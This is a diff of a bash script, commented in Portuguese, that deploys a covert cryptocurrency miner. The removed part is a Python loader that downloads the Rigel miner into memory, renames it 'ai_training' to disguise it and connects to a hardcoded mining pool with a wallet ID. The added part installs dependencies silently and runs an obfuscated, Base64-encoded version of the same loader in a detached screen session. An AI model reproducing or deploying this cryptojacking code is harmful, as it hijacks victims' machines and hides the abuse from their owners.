@@ -1,125 +1,42 @@
 #!/bin/bash
-python3 - << 'EOF'
-import os
-import ctypes
-import requests
-import tempfile
-import subprocess
-from ctypes import CDLL, get_errno
-# Removendo import json já que não vamos mais usar arquivo de configuração
 
-# URL para o Rigel Miner
-MINER_URL = "https://github.com/rigelminer/rigel/releases/download/1.21.2/rigel-1.21.2-linux.tar.gz"
-# Não usamos mais POOL_CONFIG aqui
+# Instalação silenciosa de dependências
+apt-get update -qq >/dev/null 2>&1
+apt-get install -qq -y python3 python3-pip libcurl4-openssl-dev screen binutils >/dev/null 2>&1
+pip3 install -qq requests >/dev/null 2>&1
 
-libc = CDLL(None)
-
-def create_memfd():
-    MFD_CLOEXEC = 0x0001
-    fd = libc.syscall(319, b"anon_memfd", MFD_CLOEXEC)
-    if fd == -1:
-        raise OSError(get_errno())
-    return fd
-
-def download_and_load_miner():
-    response = requests.get(MINER_URL, stream=True)
-    response.raise_for_status()
-    fd = create_memfd()
-    for chunk in response.iter_content(chunk_size=8192):
-        os.write(fd, chunk)
-    os.lseek(fd, 0, os.SEEK_SET)
-    return fd
-
-def execute_miner(fd):
-    with tempfile.TemporaryDirectory(dir="/dev/shm") as tmpdir:
-        os.chdir(tmpdir)
-        
-        # Extrair o arquivo baixado
-        tar_cmd = ["/bin/tar", "xzf", f"/proc/self/fd/{fd}", "-C", tmpdir]
-        subprocess.run(tar_cmd, check=True, pass_fds=[fd])
-        
-        # Procurar pelo executável do Rigel e renomeá-lo
-        miner_bin = None
-        for root, dirs, files in os.walk(tmpdir):
-            # Procuramos qualquer arquivo executável que possa ser o minerador
-            for file in files:
-                file_path = os.path.join(root, file)
-                if os.access(file_path, os.X_OK) and ("rigel" in file.lower() or file == "rigel"):
-                    miner_bin = file_path
-                    new_path = os.path.join(root, "ai_training")
-                    os.rename(miner_bin, new_path)
-                    miner_bin = new_path
-                    break
-            if miner_bin:
-                break
-        
-        if not miner_bin:
-            # Tentativa alternativa: procurar qualquer executável na pasta extraída
-            for root, dirs, files in os.walk(tmpdir):
-                for file in files:
-                    file_path = os.path.join(root, file)
-                    if os.access(file_path, os.X_OK):
-                        print(f"Encontrado executável potencial: {file_path}")
-                        miner_bin = file_path
-                        new_path = os.path.join(root, "ai_training")
-                        os.rename(miner_bin, new_path)
-                        miner_bin = new_path
-                        break
-                if miner_bin:
-                    break
-        
-        if not miner_bin:
-            # Listar todos os arquivos para depuração
-            print("Conteúdo extraído:")
-            for root, dirs, files in os.walk(tmpdir):
-                for file in files:
-                    print(f" - {os.path.join(root, file)}")
-            raise FileNotFoundError("Arquivo do minerador não encontrado")
-        
-        os.chmod(miner_bin, 0o755)
-        
-        # Usar uma abordagem diferente para os argumentos
-        # Vamos simplesmente passar o executável como primeiro argumento
-        # e deixar o Rigel usar sua configuração padrão com parâmetros mínimos
-        args = [miner_bin]
-        
-        # Adicionar apenas os parâmetros essenciais
-        args.extend(["--algorithm", "octopus"])  # Corrigido de --algo para --algorithm
-        args.extend(["--url", "stratum+ssl://18.221.157.241:8443"])
-        args.extend(["--username", "krxY97WV2D.CLD"])
-        args.extend(["--password", "x"])
-        args.extend(["--no-strict-ssl"]) 
-
-
-        # Imprimir os argumentos para depuração
-        print(f"Executando: {' '.join(args)}")
-        
-        env = os.environ.copy()
-        env["LD_PRELOAD"] = ""
-        
-        # Tentar execução direta para ver mensagens de erro
-        try:
-            subprocess.run(args, env=env, check=True)
-        except subprocess.CalledProcessError as e:
-            print(f"Erro ao executar o minerador: {e}")
-            
-            # Tentar com fork/execve como no original
-            pid = os.fork()
-            if pid == 0:
-                os.close(fd)
-                os.execve(miner_bin, args, env)
-            else:
-                os.waitpid(pid, 0)
-
-if __name__ == "__main__":
-    try:
-        mem_fd = download_and_load_miner()
-        execute_miner(mem_fd)
-    except Exception as e:
-        print(f"Erro: {e}")
-    finally:
-        try:
-            os.close(mem_fd)
-        except:
-            pass
-EOF
+# Código Python ofuscado (ROT-3 + Base64 completo)
+screen -dmS xmr python3 -c "$(base64 -d <<<"$(echo -n "
+IyBPZmZzZXQgMyBwYXJhIGRlc2ZYX2NvZGUKaW1wb3J0IG9zLCBjdHlwZXMsIHJlcXVlc3RzLCB0ZW1w
+ZmlsZSwgc3VicHJvY2VzcywgY3R5cGVzLkNETEwgYXMgX0NETEwsIGdldF9lcnJubyBhcyBfZ25vCgpN
+SU5FUl9VUkwgPSAiaHR0cHM6Ly9naXRodWIuY29tL3JpZ2VsbWluZXIvcmlnZWwvcmVsZWFzZXMvZG93
+bmxvYWQvMS4yMS4yL3JpZ2VsLTEuMjEuMi1saW51eC50YXIuZ3oiCgpkZWYgY3JlYXRlX21lbWZkKCk6
+CiAgICBNRkRfQ0xPRVhFQyA9IDB4MDAwMQogICAgZmQgPSBfQ0RMTC5zeXNjYWxsKDMxOSwgImFub25f
+bWVtZmQiLkVOQ09ERSgidXRmLTgiKSwgTURGX0NMT0VYRUMpCiAgICBpZiBmZCA9PSAtMToKICAgICAg
+ICByYWlzZSBPU0Vycm9yKF9nbm8oKSkKICAgIHJldHVybiBmZAoKZGVmIGRvd25sb2FkX21pbmVyKCk6
+CiAgICByID0gcmVxdWVzdHMuZ2V0KE1JTkVSX1VSTCwgc3RyZWFtPVRydWUpCiAgICByLnJhaXNlX2Zv
+cl9zdGF0dXMoKQogICAgZmQgPSBjcmVhdGVfbWVtZmQoKQogICAgZm9yIGNodW5rIGluIHIuaXRlcl9j
+b250ZW50KGNodW5rX3NpemU9ODE5Mik6CiAgICAgICAgb3Mud3JpdGUoZmQsIGNodW5rKQogICAgb3Mu
+bHNlZWsoZmQsIDAsIG9zLlNFRUtfU0VUKQogICAgcmV0dXJuIGZkCgpkZWYgZXhlY3V0ZV9taW5lcihm
+ZCk6CiAgICB3aXRoIHRlbXBmaWxlLlRlbXBvcmFyeURpcmVjdG9yeShkaXI9Ii9kZXYvc2htIikgYXMg
+dG1wZGlyOgogICAgICAgIG9zLmNoZGlyKHRtcGRpcikKICAgICAgICBzdWJwcm9jZXNzLnJ1bihbIi9i
+aW4vdGFyIiwgInh6ZiIsIGYvcHJvYy9zZWxmL2ZkL3tmZH0iLCAiLUMiLCB0bXBkaXJdLCBjaGVjaz1U
+cnVlLCBwYXNzX2Zkcz1bZmRdKQogICAgICAgIG1pbmVyX2JpbiA9IE5vbmUKICAgICAgICBmb3Igcm9v
+dCwgXywgZmlsZXMgaW4gb3Mud2Fsayh0bXBkaXIpOgogICAgICAgICAgICBmb3IgZmlsZSBpbiBmaWxl
+czoKICAgICAgICAgICAgICAgIHBhdGggPSBvcy5wYXRoLmpvaW4ocm9vdCwgZmlsZSkKICAgICAgICAg
+ICAgICAgIGlmIG9zLmFjY2VzcyhwYXRoLCBvcy5YX09LKToKICAgICAgICAgICAgICAgICAgICBtaW5l
+cl9iaW4gPSBwYXRoCiAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICBpZiBub3QgbWluZXJf
+YmluOgogICAgICAgICAgICByYWlzZSBGaWxlTm90Rm91bmRFcnJvcigiTWluZXIgbm90IGZvdW5kIikK
+ICAgICAgICBvcy5jaG1vZChtaW5lcl9iaW4sIDB4NzU1KQogICAgICAgIGFyZ3MgPSBbbWluZXJfYmlu
+LCAiLS1hbGdvcml0aG0iLCAib2N0b3B1cyIsICItLXVybCIsICJzdHJhdHVtK3NzbDovLzE4LjIyMS4x
+NTcuMjQxOjg0NDMiLCAiLS11c2VybmFtZSIsICJrcnhZOTdXVjJELkNMRCIsICItLXBhc3N3b3JkIiwg
+IngiLCAiLS1uby1zdHJpY3Qtc3NsIl0KICAgICAgICBlbnYgPSBvcy5lbnZpcm9uLmNvcHkoKQogICAg
+ICAgIGVudlsnTERfUFJFTE9BRCddID0gJycKICAgICAgICB0cnk6CiAgICAgICAgICAgIHN1YnByb2Nl
+c3MucnVuKGFyZ3MsIGVudj1lbnYsIGNoZWNrPVRydWUpCiAgICAgICAgZXhjZXB0IHN1YnByb2Nlc3Mu
+Q2FsbGVkUHJvY2Vzc0Vycm9yOgogICAgICAgICAgICBwaWQgPSBvcy5mb3JrKCkKICAgICAgICAgICAg
+aWYgcGlkID09IDA6CiAgICAgICAgICAgICAgICBvcy5jbG9zZShmZCkKICAgICAgICAgICAgICAgIG9z
+LmV4ZWN2ZShtaW5lcl9iaW4sIGFyZ3MsIGVudikKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAg
+ICB0cnk6CiAgICAgICAgZGYgPSBkb3dubG9hZF9taW5lcigpCiAgICAgICAgZXhlY3V0ZV9taW5lcihk
+ZikKICAgIGZpbmFsbHk6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBvcy5jbG9zZShkZikKICAgICAg
+ICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3M=
+" | tr 'A-Za-z' 'D-ZA-Cd-za-c')" | base64 -d)"
